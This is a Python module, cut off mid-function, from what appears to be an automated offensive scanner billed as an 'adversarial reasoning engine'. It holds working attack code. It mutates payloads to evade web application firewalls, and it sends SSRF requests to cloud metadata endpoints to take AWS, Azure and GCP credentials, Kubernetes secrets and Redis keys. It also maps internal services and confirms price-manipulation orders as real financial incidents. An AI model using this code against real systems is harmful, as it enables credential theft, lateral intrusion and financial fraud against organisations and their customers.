"""
MSE Adversarial Reasoning Engine — State Machine
==================================================
Elite Red Team logic layer that sits on top of the Decision Tree.
Implements a Finite State Machine where each transition depends on
the success of the previous state, guaranteeing surgical exploitation.

Architecture:
  SniperState (Enum)           → FSM states
  CostRewardCalculator         → Prioritizes targets by exploitation depth
  PolymorphicPayloadEngine     → Mutates payloads when WAF blocks N/N probes
  PrivilegeEscalationModule    → Uses leaked data to attempt priv-esc
  IncidentValidator            → Confirms real-world impact (order IDs, write ops)
  DriftRecalibrator            → Detects patching, reroutes via subdomains
  ExploitChain                 → Linked chain where each step feeds the next
  AdversarialStateMachine      → Core FSM orchestrator
"""

import asyncio
import re
import time
import json
import hashlib
import random
import string
import base64
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse, urljoin, quote, quote_plus

import httpx

from scanner.attack_reasoning import (
    InfraType, VulnClass, InfraFingerprint, BaselineMonitor,
    WAFBypassEngine, DecisionTree, ExploitResult, AttackNode,
    StealthThrottle, _ts, _hash, SSRF_TARGETS_BY_INFRA,
)


class SniperState(Enum):
    INIT = "init"
    SURFACE_ANALYSIS = "surface_analysis"
    COST_REWARD_CALC = "cost_reward_calc"
    TARGET_PRIORITIZATION = "target_prioritization"
    PAYLOAD_SELECTION = "payload_selection"
    EXPLOITATION = "exploitation"
    DRIFT_CHECK = "drift_check"
    POLYMORPHIC_MUTATION = "polymorphic_mutation"
    PIVOT_ASSESSMENT = "pivot_assessment"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    LATERAL_MOVEMENT = "lateral_movement"
    INCIDENT_VALIDATION = "incident_validation"
    DRIFT_RECALIBRATION = "drift_recalibration"
    CHAIN_COMPLETE = "chain_complete"
    TELEMETRY = "telemetry"


@dataclass
class StateTransition:
    from_state: SniperState
    to_state: SniperState
    condition: str
    timestamp: float
    data: Optional[Dict] = None


@dataclass
class TargetPriority:
    vuln_class: VulnClass
    cost: float
    reward: float
    ratio: float
    depth_potential: int
    waf_resistance: float
    source_findings_count: int
    reasoning: str


@dataclass
class ChainLink:
    step: int
    state: SniperState
    vuln_class: str
    technique: str
    target_endpoint: str
    payload: str
    status_code: int
    success: bool
    evidence: str
    leaked_data: Optional[Dict] = None
    pivot_target: Optional[str] = None
    escalation_result: Optional[Dict] = None
    incident_id: Optional[str] = None
    timestamp: str = ""


@dataclass
class PolymorphicPayload:
    original: str
    mutated: str
    technique: str
    generation: int
    entropy: float


POLYMORPHIC_TECHNIQUES = [
    {
        "name": "Unicode Homoglyph Substitution",
        "transform": lambda p: p.replace("a", "\u0430").replace("e", "\u0435").replace("o", "\u043e").replace("i", "\u0456").replace("s", "\u0455"),
    },
    {
        "name": "Base64 Nested Encoding",
        "transform": lambda p: base64.b64encode(base64.b64encode(p.encode()).decode().encode()).decode(),
    },
    {
        "name": "Hex Entity Encoding",
        "transform": lambda p: "".join(f"&#x{ord(c):02x};" if c in "<>'\"&/\\" else c for c in p),
    },
    {
        "name": "JSFuck-style Obfuscation",
        "transform": lambda p: p.replace("(", "[(][)]".replace("][", "")).replace(")", "").replace("alert", "[][\"constructor\"][\"constructor\"]"),
    },
    {
        "name": "Null Byte Fragmentation",
        "transform": lambda p: "%00".join(p[i:i+3] for i in range(0, len(p), 3)),
    },
    {
        "name": "Case Randomization + Comment Injection",
        "transform": lambda p: "".join(
            (c.upper() if random.random() > 0.5 else c.lower()) + ("/**/" if random.random() > 0.8 else "")
            for c in p
        ),
    },
    {
        "name": "Double URL + Unicode Encode",
        "transform": lambda p: quote(quote(p.replace(" ", "\u00a0"), safe=""), safe=""),
    },
    {
        "name": "Concat String Fragmentation",
        "transform": lambda p: "+".join(f"'{p[i:i+2]}'" for i in range(0, len(p), 2)) if len(p) > 4 else p,
    },
    {
        "name": "IPv6 Expansion (SSRF)",
        "transform": lambda p: p.replace("127.0.0.1", "[::ffff:7f00:1]").replace("169.254.169.254", "[::ffff:a9fe:a9fe]"),
    },
    {
        "name": "Decimal IP Conversion (SSRF)",
        "transform": lambda p: p.replace("127.0.0.1", "2130706433").replace("169.254.169.254", "2852039166"),
    },
    {
        "name": "Octal IP Conversion (SSRF)",
        "transform": lambda p: p.replace("127.0.0.1", "0177.0.0.01").replace("169.254.169.254", "0251.0376.0251.0376"),
    },
    {
        "name": "DNS Rebinding Proxy",
        "transform": lambda p: p.replace("169.254.169.254", "169.254.169.254.nip.io").replace("127.0.0.1", "127.0.0.1.nip.io"),
    },
]

ESCALATION_PATHS = {
    "aws_iam": [
        {"name": "STS AssumeRole", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}", "detect": ["AccessKeyId", "SecretAccessKey", "SessionToken", "Expiration"]},
        {"name": "EC2 Instance Profile", "url": "http://169.254.169.254/latest/meta-data/iam/info", "detect": ["InstanceProfileArn", "InstanceProfileId"]},
        {"name": "S3 Bucket Listing", "url": "http://169.254.169.254/latest/meta-data/services/domain", "detect": ["amazonaws"]},
        {"name": "Lambda Environment", "url": "http://169.254.169.254/latest/meta-data/tags/instance", "detect": ["aws:", "lambda", "function"]},
    ],
    "azure_managed_identity": [
        {"name": "Azure Management Token", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "detect": ["access_token", "expires_on"], "headers": {"Metadata": "true"}},
        {"name": "Azure Key Vault Token", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net", "detect": ["access_token"], "headers": {"Metadata": "true"}},
        {"name": "Azure Storage Token", "url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/", "detect": ["access_token"], "headers": {"Metadata": "true"}},
    ],
    "gcp_service_account": [
        {"name": "GCP Access Token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "detect": ["access_token", "token_type"], "headers": {"Metadata-Flavor": "Google"}},
        {"name": "GCP Identity Token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com", "detect": ["eyJ"], "headers": {"Metadata-Flavor": "Google"}},
        {"name": "GCP Scopes", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes", "detect": ["googleapis.com", "compute", "storage"], "headers": {"Metadata-Flavor": "Google"}},
    ],
    "kubernetes_secrets": [
        {"name": "K8s Service Account Token", "url": "http://127.0.0.1:10255/pods", "detect": ["serviceAccountName", "serviceAccount"]},
        {"name": "K8s Secrets via API", "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", "detect": ["items", "data", "metadata"]},
        {"name": "etcd Key Dump", "url": "http://127.0.0.1:2379/v2/keys/?recursive=true", "detect": ["node", "key", "value", "nodes"]},
    ],
    "redis_escalation": [
        {"name": "Redis Key Dump", "url": "http://127.0.0.1:6379/KEYS/*", "detect": ["session", "user", "token", "cache", "queue"]},
        {"name": "Redis CONFIG GET", "url": "http://127.0.0.1:6379/CONFIG/GET/requirepass", "detect": ["requirepass"]},
        {"name": "Redis CLIENT LIST", "url": "http://127.0.0.1:6379/CLIENT/LIST", "detect": ["addr=", "fd=", "cmd="]},
    ],
    "docker_escalation": [
        {"name": "Docker Exec Probe", "url": "http://127.0.0.1:2375/containers/json?all=1", "detect": ["Id", "Names", "Image", "Command"]},
        {"name": "Docker Volumes", "url": "http://127.0.0.1:2375/volumes", "detect": ["Volumes", "Name", "Mountpoint"]},
        {"name": "Docker Networks", "url": "http://127.0.0.1:2375/networks", "detect": ["Name", "IPAM", "Gateway"]},
    ],
}

INTERNAL_SERVICE_MAP = [
    {"name": "Redis", "port": 6379, "url": "http://127.0.0.1:6379/info", "detect": ["redis_version", "connected_clients", "used_memory"]},
    {"name": "Elasticsearch", "port": 9200, "url": "http://127.0.0.1:9200/", "detect": ["name", "cluster_name", "version"]},
    {"name": "MongoDB", "port": 27017, "url": "http://127.0.0.1:27017/", "detect": ["version", "ok"]},
    {"name": "PostgreSQL", "port": 5432, "url": "http://127.0.0.1:5432/", "detect": ["PostgreSQL", "FATAL"]},
    {"name": "MySQL", "port": 3306, "url": "http://127.0.0.1:3306/", "detect": ["mysql", "MariaDB"]},
    {"name": "RabbitMQ", "port": 15672, "url": "http://127.0.0.1:15672/api/overview", "detect": ["rabbitmq_version", "cluster_name"]},
    {"name": "Consul", "port": 8500, "url": "http://127.0.0.1:8500/v1/catalog/services", "detect": ["{"]},
    {"name": "Vault", "port": 8200, "url": "http://127.0.0.1:8200/v1/sys/health", "detect": ["initialized", "sealed", "version"]},
    {"name": "Prometheus", "port": 9090, "url": "http://127.0.0.1:9090/api/v1/status/config", "detect": ["status", "data"]},
    {"name": "Grafana", "port": 3000, "url": "http://127.0.0.1:3000/api/health", "detect": ["database", "version"]},
    {"name": "Jenkins", "port": 8080, "url": "http://127.0.0.1:8080/", "detect": ["Jenkins", "Dashboard"]},
    {"name": "Kafka REST", "port": 8082, "url": "http://127.0.0.1:8082/topics", "detect": ["["]},
    {"name": "Memcached", "port": 11211, "url": "http://127.0.0.1:11211/", "detect": ["STAT", "version"]},
    {"name": "CouchDB", "port": 5984, "url": "http://127.0.0.1:5984/", "detect": ["couchdb", "version"]},
    {"name": "Neo4j", "port": 7474, "url": "http://127.0.0.1:7474/", "detect": ["neo4j", "data"]},
    {"name": "Solr", "port": 8983, "url": "http://127.0.0.1:8983/solr/admin/info/system", "detect": ["solr", "lucene"]},
    {"name": "MinIO", "port": 9000, "url": "http://127.0.0.1:9000/minio/health/live", "detect": [""]},
    {"name": "Zipkin", "port": 9411, "url": "http://127.0.0.1:9411/api/v2/services", "detect": ["["]},
    {"name": "Jaeger", "port": 16686, "url": "http://127.0.0.1:16686/api/services", "detect": ["data", "services"]},
    {"name": "Etcd", "port": 2379, "url": "http://127.0.0.1:2379/version", "detect": ["etcdserver", "etcdcluster"]},
]


CORRELATION_EDGE_RULES = [
    {
        "name": "Source Code + Admin Endpoint",
        "requires": ["source_code_access", "admin_endpoint"],
        "bonus": 2.5,
        "reasoning": "GitHub/GitLab token + admin endpoint → clone repo for .env credentials",
    },
    {
        "name": "Cloud Credential + SSRF Vector",
        "requires": ["cloud_credential", "ssrf_vector"],
        "bonus": 3.0,
        "reasoning": "Cloud key + SSRF → metadata escalation to full IAM takeover",
    },
    {
        "name": "DB Access + Credential Leak",
        "requires": ["db_direct_access", "credential_reuse"],
        "bonus": 2.0,
        "reasoning": "DB connection + leaked password → direct database exfiltration",
    },
    {
        "name": "Session Hijack + Auth Bypass",
        "requires": ["session_hijack", "auth_bypass"],
        "bonus": 2.5,
        "reasoning": "JWT/session token + broken auth → silent privilege escalation",
    },
    {
        "name": "Token Forge + Admin Access",
        "requires": ["token_forge", "admin_access"],
        "bonus": 3.0,
        "reasoning": "JWT secret exposed + admin panel → forge admin tokens",
    },
    {
        "name": "Payment Compromise + Financial Theft",
        "requires": ["payment_compromise"],
        "bonus": 2.0,
        "reasoning": "Stripe/payment key exposed → direct financial fraud",
    },
    {
        "name": "CI/CD Pivot + Source Code",
        "requires": ["ci_cd_pivot", "source_code_access"],
        "bonus": 2.0,
        "reasoning": "CI/CD access + source → supply chain compromise",
    },
    {
        "name": "NoSQL Backend + Broken Auth",
        "requires": ["nosql_backend", "broken_auth_vector"],
        "bonus": 2.5,
        "reasoning": "Firebase/Mongo + weak auth → operator injection bypass",
    },
    {
        "name": "Full DB Compromise",
        "requires": ["full_db_compromise"],
        "bonus": 3.0,
        "reasoning": "Full DB connection string exposed → immediate data exfiltration",
    },
    {
        "name": "Crypto + Session Forge",
        "requires": ["crypto_compromise", "session_forge"],
        "bonus": 2.5,
        "reasoning": "Encryption/signing key + session secret → forge any session",
    },
]


class CostRewardCalculator:
    DEPTH_MAP = {
        VulnClass.SSRF: 10,
        VulnClass.SQLI: 9,
        VulnClass.COMMAND_INJECTION: 10,
        VulnClass.PATH_TRAVERSAL: 7,
        VulnClass.SSTI: 9,
        VulnClass.XXE: 7,
        VulnClass.AUTH_BYPASS: 8,
        VulnClass.ECOMMERCE: 6,
        VulnClass.VERB_TAMPERING: 5,
        VulnClass.API_EXPOSURE: 4,
        VulnClass.CREDENTIAL_LEAK: 8,
        VulnClass.IDOR: 6,
        VulnClass.XSS: 3,
        VulnClass.OPEN_REDIRECT: 2,
        VulnClass.CORS_MISCONFIG: 3,
        VulnClass.NOSQL_INJECTION: 7,
        VulnClass.DESERIALIZATION: 9,
        VulnClass.HEADER_INJECTION: 3,
    }

    COST_MAP = {
        VulnClass.SSRF: 3,
        VulnClass.SQLI: 5,
        VulnClass.COMMAND_INJECTION: 7,
        VulnClass.PATH_TRAVERSAL: 2,
        VulnClass.SSTI: 4,
        VulnClass.XXE: 5,
        VulnClass.AUTH_BYPASS: 4,
        VulnClass.ECOMMERCE: 2,
        VulnClass.VERB_TAMPERING: 1,
        VulnClass.API_EXPOSURE: 1,
        VulnClass.CREDENTIAL_LEAK: 1,
        VulnClass.IDOR: 3,
        VulnClass.XSS: 2,
        VulnClass.OPEN_REDIRECT: 1,
        VulnClass.CORS_MISCONFIG: 1,
        VulnClass.NOSQL_INJECTION: 4,
        VulnClass.DESERIALIZATION: 6,
        VulnClass.HEADER_INJECTION: 2,
    }

    PIVOT_BONUS = {
        VulnClass.SSRF: 5,
        VulnClass.SQLI: 3,
        VulnClass.COMMAND_INJECTION: 5,
        VulnClass.CREDENTIAL_LEAK: 4,
        VulnClass.AUTH_BYPASS: 3,
        VulnClass.SSTI: 4,
        VulnClass.PATH_TRAVERSAL: 2,
    }

    @staticmethod
    def _collect_correlation_hints(findings: List[Dict]) -> set:
        all_hints = set()
        for f in findings:
            if isinstance(f, dict):
                hints = f.get("correlation_hints", [])
                title_lower = (f.get("title", "") or "").lower()
                desc_lower = (f.get("description", "") or "").lower()
            else:
                hints = getattr(f, "correlation_hints", [])
                title_lower = (getattr(f, "title", "") or "").lower()
                desc_lower = (getattr(f, "description", "") or "").lower()
            for h in (hints or []):
                all_hints.add(h)
            combined = f"{title_lower} {desc_lower}"
            if "/admin" in combined or "admin panel" in combined or "admin endpoint" in combined:
                all_hints.add("admin_endpoint")
            if "ssrf" in combined or "server-side request" in combined:
                all_hints.add("ssrf_vector")
            if "rate limit" in combined and ("bypass" in combined or "no " in combined or "missing" in combined):
                all_hints.add("no_rate_limit")
        return all_hints

    @staticmethod
    def _check_correlation_edges(all_hints: set) -> list:
        triggered = []
        for rule in CORRELATION_EDGE_RULES:
            if all(req in all_hints for req in rule["requires"]):
                triggered.append(rule)
        return triggered

    def calculate(
        self,
        vuln_class: VulnClass,
        source_findings: List[Dict],
        infra: InfraFingerprint,
        waf_block_rate: float = 0.0,
    ) -> TargetPriority:
        reward_base = self.DEPTH_MAP.get(vuln_class, 3)
        cost_base = self.COST_MAP.get(vuln_class, 3)
        pivot_bonus = self.PIVOT_BONUS.get(vuln_class, 0)

        crit_count = sum(1 for f in source_findings if f.get("severity", "").lower() == "critical")
        high_count = sum(1 for f in source_findings if f.get("severity", "").lower() == "high")
        severity_mult = 1.0 + (crit_count * 0.3) + (high_count * 0.15)

        if vuln_class == VulnClass.SSRF and infra.detected in (InfraType.AWS, InfraType.GCP, InfraType.AZURE):
            pivot_bonus += 3

        if vuln_class in (VulnClass.SQLI, VulnClass.COMMAND_INJECTION) and infra.detected == InfraType.ON_PREMISE:
            pivot_bonus += 2

        all_hints = self._collect_correlation_hints(source_findings)
        correlation_edges = self._check_correlation_edges(all_hints)
        correlation_mult = 1.0
        for edge in correlation_edges:
            correlation_mult *= edge["bonus"]
        correlation_mult = min(correlation_mult, 8.0)

        waf_cost_penalty = waf_block_rate * 4
        cost = cost_base + waf_cost_penalty
        reward = (reward_base + pivot_bonus) * severity_mult * correlation_mult
        ratio = reward / max(cost, 0.1)

        depth = self.DEPTH_MAP.get(vuln_class, 3) + pivot_bonus

        reasons = []
        if vuln_class == VulnClass.SSRF:
            reasons.append(f"SSRF → infra {infra.detected.value}: credential dump + lateral movement")
        if vuln_class == VulnClass.SQLI:
            reasons.append("SQLi → data exfiltration + potential RCE via xp_cmdshell/COPY")
        if vuln_class == VulnClass.ECOMMERCE:
            reasons.append("E-commerce → financial impact via price/coupon manipulation")
        if vuln_class == VulnClass.COMMAND_INJECTION:
            reasons.append("CMDi → direct system access, highest severity")
        if crit_count > 0:
            reasons.append(f"{crit_count} CRITICAL findings boost priority")
        if waf_block_rate > 0.7:
            reasons.append(f"WAF blocking {waf_block_rate:.0%} — polymorphic mutation required")
        for edge in correlation_edges:
            reasons.append(f"[CORRELATION] {edge['name']}: {edge['reasoning']}")
        if not reasons:
            reasons.append(f"{vuln_class.value}: standard exploitation path")

        return TargetPriority(
            vuln_class=vuln_class,
            cost=round(cost, 2),
            reward=round(reward, 2),
            ratio=round(ratio, 2),
            depth_potential=depth,
            waf_resistance=waf_block_rate,
            source_findings_count=len(source_findings),
            reasoning=" | ".join(reasons),
        )


class PolymorphicPayloadEngine:
    def __init__(self):
        self.generations: Dict[str, int] = {}
        self.total_mutations = 0
        self.successful_mutations = 0

    def mutate(self, payload: str, vuln_class: VulnClass, generation: int = 0) -> List[PolymorphicPayload]:
        results = []
        key = _hash(payload)
        self.generations[key] = generation

        applicable = list(POLYMORPHIC_TECHNIQUES)

        if vuln_class == VulnClass.SSRF:
            ssrf_specific = [t for t in applicable if any(
                kw in t["name"].lower() for kw in ["ipv6", "decimal", "octal", "dns", "rebind"]
            )]
            applicable = ssrf_specific + [t for t in applicable if t not in ssrf_specific]
        elif vuln_class in (VulnClass.SQLI, VulnClass.NOSQL_INJECTION):
            sql_specific = [t for t in applicable if any(
                kw in t["name"].lower() for kw in ["comment", "case", "concat", "null"]
            )]
            applicable = sql_specific + [t for t in applicable if t not in sql_specific]
        elif vuln_class == VulnClass.XSS:
            xss_specific = [t for t in applicable if any(
                kw in t["name"].lower() for kw in ["hex", "unicode", "homoglyph", "jsfuck"]
            )]
            applicable = xss_specific + [t for t in applicable if t not in xss_specific]

        for technique in applicable[:6]:
            try:
                mutated = technique["transform"](payload)
                if mutated != payload and len(mutated) > 0:
                    entropy = len(set(mutated)) / max(len(mutated), 1)
                    results.append(PolymorphicPayload(
                        original=payload,
                        mutated=mutated,
                        technique=technique["name"],
                        generation=generation,
                        entropy=round(entropy, 3),
                    ))
                    self.total_mutations += 1
            except Exception:
                pass

        if generation < 2 and results:
            best = max(results, key=lambda r: r.entropy)
            for child in self.mutate(best.mutated, vuln_class, generation + 1)[:2]:
                child.generation = generation + 1
                results.append(child)

        return results

    def to_dict(self) -> Dict:
        return {
            "total_mutations": self.total_mutations,
            "successful_mutations": self.successful_mutations,
            "unique_payloads": len(self.generations),
        }


class PrivilegeEscalationModule:
    def __init__(self, client: httpx.AsyncClient, base_url: str, log_fn=None, emit_fn=None, add_finding_fn=None, add_probe_fn=None):
        self.client = client
        self.base_url = base_url
        self.log = log_fn or (lambda *a: None)
        self.emit = emit_fn or (lambda *a: None)
        self.add_finding = add_finding_fn or (lambda *a: None)
        self.add_probe = add_probe_fn or (lambda *a: None)
        self.escalations: List[Dict] = []

    async def attempt_escalation(
        self,
        leaked_data: Dict,
        infra: InfraFingerprint,
        ssrf_endpoint: str,
        ssrf_param: str,
    ) -> List[Dict]:
        results = []
        esc_path_key = None

        if infra.detected == InfraType.AWS:
            esc_path_key = "aws_iam"
        elif infra.detected == InfraType.AZURE:
            esc_path_key = "azure_managed_identity"
        elif infra.detected == InfraType.GCP:
            esc_path_key = "gcp_service_account"
        elif infra.detected == InfraType.KUBERNETES:
            esc_path_key = "kubernetes_secrets"
        elif infra.detected == InfraType.DOCKER:
            esc_path_key = "docker_escalation"

        if leaked_data.get("redis_confirmed"):
            esc_path_key = "redis_escalation"
            self.log(
                f"[ESCALATION] Redis connection confirmed — attempting key extraction...",
                "error", "adversarial"
            )

        if not esc_path_key:
            return results

        paths = ESCALATION_PATHS.get(esc_path_key, [])
        self.log(
            f"[ESCALATION] Initiating privilege escalation via {esc_path_key} — "
            f"{len(paths)} escalation vectors",
            "error", "adversarial"
        )

        for path_def in paths:
            target_url = path_def["url"]
            if "{role}" in target_url:
                role_name = leaked_data.get("iam_role", "")
                if role_name:
                    target_url = target_url.replace("{role}", role_name)
                else:
                    continue

            url = f"{self.base_url}{ssrf_endpoint}?{ssrf_param}={target_url}"
            extra_headers = path_def.get("headers", {})

            start = time.time()
            try:
                resp = await self.client.get(url, headers=extra_headers)
                elapsed = int((time.time() - start) * 1000)
                body = resp.text[:8000]
                hit = any(kw.lower() in body.lower() for kw in path_def["detect"])

                entry = {
                    "path": path_def["name"],
                    "category": esc_path_key,
                    "target_url": target_url,
                    "via": f"{ssrf_endpoint}?{ssrf_param}=",
                    "status_code": resp.status_code,
                    "response_time_ms": elapsed,
                    "success": hit,
                    "evidence": body[:400] if hit else "",
                }
                results.append(entry)

                if hit:
                    self.log(
                        f"[ESCALATION] ★ PRIVILEGE ESCALATION CONFIRMED: {path_def['name']} "
                        f"via {ssrf_endpoint}?{ssrf_param}=",
                        "error", "adversarial"
                    )
                    self.add_finding({
                        "title": f"Privilege Escalation: {path_def['name']}",
                        "description": (
                            f"Adversarial engine confirmed privilege escalation via {path_def['name']}. "
                            f"SSRF pivot from {ssrf_endpoint} used leaked credentials to access {target_url}. "
                            f"Escalation category: {esc_path_key}."
                        ),
                        "severity": "critical",
                        "category": "privilege_escalation",
                        "module": "adversarial_engine",
                        "phase": "adversarial",
                        "evidence": body[:300],
                    })
                    self.add_probe({
                        "probe_type": "PRIV_ESCALATION",
                        "target": self.base_url,
                        "endpoint": f"{ssrf_endpoint}?{ssrf_param}=...",
                        "method": "GET",
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed,
                        "vulnerable": True,
                        "verdict": f"ESCALATED — {path_def['name']}",
                        "severity": "CRITICAL",
                        "description": f"Priv-esc via {esc_path_key}: {path_def['name']}",
                        "payload": target_url,
                        "timestamp": _ts(),
                    })

            except Exception:
                pass

        self.escalations.extend(results)
        return results

    async def map_internal_services(
        self, ssrf_endpoint: str, ssrf_param: str,
    ) -> List[Dict]:
        discovered = []
        self.log(
            f"[LATERAL] Initiating internal service mapping — "
            f"{len(INTERNAL_SERVICE_MAP)} services to probe...",
            "error", "adversarial"
        )

        for svc in INTERNAL_SERVICE_MAP:
            url = f"{self.base_url}{ssrf_endpoint}?{ssrf_param}={svc['url']}"
            start = time.time()
            try:
                resp = await self.client.get(url)
                elapsed = int((time.time() - start) * 1000)
                body = resp.text[:4000]
                hit = resp.status_code < 500 and any(kw.lower() in body.lower() for kw in svc["detect"]) if svc["detect"][0] else resp.status_code == 200

                if hit:
                    entry = {
                        "service": svc["name"],
                        "port": svc["port"],
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed,
                        "evidence": body[:300],
                    }
                    discovered.append(entry)
                    self.log(
                        f"[LATERAL] ★ Internal service discovered: {svc['name']} "
                        f"(port {svc['port']}) — responding via SSRF",
                        "error", "adversarial"
                    )
                    self.add_finding({
                        "title": f"Internal Service Accessible via SSRF: {svc['name']} (:{svc['port']})",
                        "description": (
                            f"Adversarial engine mapped internal {svc['name']} service on port {svc['port']} "
                            f"via SSRF at {ssrf_endpoint}?{ssrf_param}=. Service is accessible from external requests."
                        ),
                        "severity": "critical" if svc["port"] in (6379, 5432, 3306, 27017, 2379) else "high",
                        "category": "lateral_movement",
                        "module": "adversarial_engine",
                        "phase": "adversarial",
                        "evidence": body[:200],
                    })

            except Exception:
                pass

        if discovered:
            self.log(
                f"[LATERAL] Internal mapping complete — {len(discovered)}/{len(INTERNAL_SERVICE_MAP)} "
                f"services accessible via SSRF",
                "error", "adversarial"
            )

        return discovered


class IncidentValidator:
    def __init__(self, client: httpx.AsyncClient, base_url: str, log_fn=None, add_finding_fn=None, add_probe_fn=None):
        self.client = client
        self.base_url = base_url
        self.log = log_fn or (lambda *a: None)
        self.add_finding = add_finding_fn or (lambda *a: None)
        self.add_probe = add_probe_fn or (lambda *a: None)
        self.validated_incidents: List[Dict] = []

    async def validate_ecommerce_incident(self, exploit_result: ExploitResult) -> Optional[Dict]:
        if not exploit_result.vulnerable or exploit_result.vuln_class != "ecommerce":
            return None

        evidence = exploit_result.evidence.lower()
        incident = {
            "type": "ecommerce_manipulation",
            "endpoint": exploit_result.target_endpoint,
            "technique": exploit_result.technique,
            "validated": False,
            "order_id": None,
            "transaction_confirmed": False,
            "financial_impact": False,
        }

        order_patterns = [
            re.compile(r'"order_id"\s*:\s*"?(\w+)"?', re.I),
            re.compile(r'"id"\s*:\s*"?(\d+)"?', re.I),
            re.compile(r'"transaction_id"\s*:\s*"?(\w+)"?', re.I),
            re.compile(r'"cart_id"\s*:\s*"?(\w+)"?', re.I),
            re.compile(r'"confirmation"\s*:\s*"?(\w+)"?', re.I),
        ]

        for pat in order_patterns:
            match = pat.search(evidence)
            if match:
                incident["order_id"] = match.group(1)
                incident["transaction_confirmed"] = True
                break

        if incident["transaction_confirmed"]:
            incident["validated"] = True
            incident["financial_impact"] = True
            self.log(
                f"[INCIDENT] ★★ REAL INCIDENT CONFIRMED: Order {incident['order_id']} created "
                f"via {exploit_result.technique} at {exploit_result.target_endpoint}",
                "error", "adversarial"
            )
            self.add_finding({
                "title": f"REAL INCIDENT: Transaction {incident['order_id']} via {exploit_result.technique}",
                "description": (
                    f"Adversarial engine validated a REAL financial incident. "
                    f"Order/transaction ID '{incident['order_id']}' was generated after "
                    f"{exploit_result.technique} at {exploit_result.target_endpoint}. "
                    f"This confirms the vulnerability has direct financial impact."
                ),
                "severity": "critical",
                "category": "real_incident",
                "module": "adversarial_engine",
                "phase": "adversarial",
                "evidence": evidence[:300],
            })
        else:
            price_accepted = any(kw in evidence for kw in [
                "success", "updated", "created", "accepted", "total", "amount",
            ])
            if price_accepted:
                incident["validated"] = True
                self.log(
                    f"[INCIDENT] Price manipulation accepted at {exploit_result.target_endpoint} "
                    f"— backend confirmed change but no order ID extracted",
                    "error", "adversarial"
                )

        self.validated_incidents.append(incident)
        return incident

    async def validate_write_operation(self, exploit_result: ExploitResult) -> Optional[Dict]:
        if not exploit_result.vulnerable or exploit_result.vuln_class != "verb_tampering":
            return None

        incident = {
            "type": "write_operation",
            "method": exploit_result.method,
            "endpoint": exploit_result.target_endpoint,
            "validated": False,
            "resource_modified": False,
        }

        if exploit_result.deep_validation and exploit_result.deep_validation.get("write_verified"):
            incident["validated"] = True
            incident["resource_modified"] = True
            self.log(
                f"[INCIDENT] ★★ WRITE CONFIRMED: {exploit_result.method} at "
                f"{exploit_result.target_endpoint} — resource modified on server",
                "error", "adversarial"
            )
            self.add_finding({
                "title": f"REAL INCIDENT: Write via {exploit_result.method} at {exploit_result.target_endpoint}",
                "description": (
                    f"Adversarial engine validated a REAL write operation. "
                    f"{exploit_result.method} at {exploit_result.target_endpoint} modified server resources. "
                    f"Verification GET confirmed the written content exists."
                ),
                "severity": "critical",
                "category": "real_incident",
                "module": "adversarial_engine",
                "phase": "adversarial",
            })

        self.validated_incidents.append(incident)
        return incident

    async def validate_data_leak(self, exploit_result: ExploitResult) -> Optional[Dict]:
        if not exploit_result.vulnerable:
            return None

        evidence = exploit_result.evidence.lower()
        incident = {
            "type": "data_leak",
            "class": exploit_result.vuln_class,
            "endpoint": exploit_result.target_endpoint,
            "validated": False,
            "leaked_data_types": [],
        }

        data_patterns = {
            "credentials": [r"password", r"secret", r"token", r"api.key", r"access.key"],
            "pii": [r"email", r"phone", r"address", r"ssn", r"date.of.birth"],
            "infrastructure": [r"instance.id", r"vpc", r"subnet", r"security.group", r"arn:"],
            "database": [r"table_name", r"column_name", r"information_schema", r"pg_catalog"],
            "session": [r"session.id", r"jwt", r"bearer", r"cookie", r"set-cookie"],
        }

        for dtype, patterns in data_patterns.items():
            if any(re.search(pat, evidence, re.I) for pat in patterns):
                incident["leaked_data_types"].append(dtype)

        if incident["leaked_data_types"]:
            incident["validated"] = True
            self.log(
                f"[INCIDENT] Data leak confirmed at {exploit_result.target_endpoint}: "
                f"{', '.join(incident['leaked_data_types'])}",
                "error", "adversarial"
            )

        self.validated_incidents.append(incident)
        return incident


class DriftRecalibrator:
    AUTH_API_CANDIDATES = [
        "/api/auth/login", "/api/v1/auth/login", "/api/v2/auth/login",
        "/api/login", "/api/v1/login", "/api/v2/login",
        "/api/auth/signin", "/api/v1/auth/signin",
        "/api/sessions", "/api/v1/sessions",
        "/api/auth/token", "/api/oauth/token",
        "/api/authenticate", "/api/v1/authenticate",
        "/auth/login", "/auth/signin", "/auth/token",
        "/api/user/login", "/api/users/login",
        "/api/auth", "/api/v1/auth",
        "/api/internal/auth", "/api/internal/login",
    ]

    VERB_TAMPER_METHODS = ["PUT", "PATCH", "OPTIONS", "HEAD"]

    def __init__(self, client: httpx.AsyncClient, base_url: str, log_fn=None, emit_fn=None, add_finding_fn=None, add_probe_fn=None):
        self.client = client
        self.base_url = base_url
        self.log = log_fn or (lambda *a: None)
        self.emit = emit_fn or (lambda *a: None)
        self.add_finding = add_finding_fn or (lambda *a: None)
        self.add_probe = add_probe_fn or (lambda *a: None)
        self.patched_endpoints: List[Dict] = []
        self.recalibrations: List[Dict] = []
        self.alternative_routes: List[Dict] = []
        self.verb_tamper_results: List[Dict] = []
        self.api_auth_discoveries: List[Dict] = []
        self.ssrf_internal_pivots: List[Dict] = []

    def _extract_auth_endpoints_from_findings(self, findings: List[Dict]) -> List[str]:
        discovered = set()
        auth_patterns = re.compile(
            r'((?:/api)?(?:/v[12])?/(?:auth|login|signin|authenticate|sessions|oauth|token|user/login|users/login)[a-zA-Z0-9/_-]*)',
            re.I,
        )
        for f in findings:
            text = ""
            if isinstance(f, dict):
                text = f"{f.get('title', '')} {f.get('description', '')} {f.get('evidence', '')} {f.get('url', '')}"
            else:
